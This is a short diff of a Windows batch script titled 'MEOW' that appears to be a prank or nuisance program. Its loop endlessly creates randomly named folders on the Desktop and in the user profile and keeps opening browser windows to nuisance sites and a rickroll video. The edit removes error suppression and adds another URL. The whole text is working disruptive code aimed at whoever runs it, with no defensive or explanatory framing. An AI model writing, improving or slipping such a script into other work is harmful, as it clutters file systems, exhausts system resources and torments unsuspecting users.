@@ -4,6 +4,7 @@ start
 title MEOW
 md "%USERPROFILE%\Desktop\MEOW->%random%"
 md "%USERPROFILE%\%random%"
-2>NUL start "" https://piv.pivpiv.dk/
-2>NUL start "" https://youareanidiot.cc/
+start "" https://piv.pivpiv.dk/
+start "" https://youareanidiot.cc/
+start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
 goto top
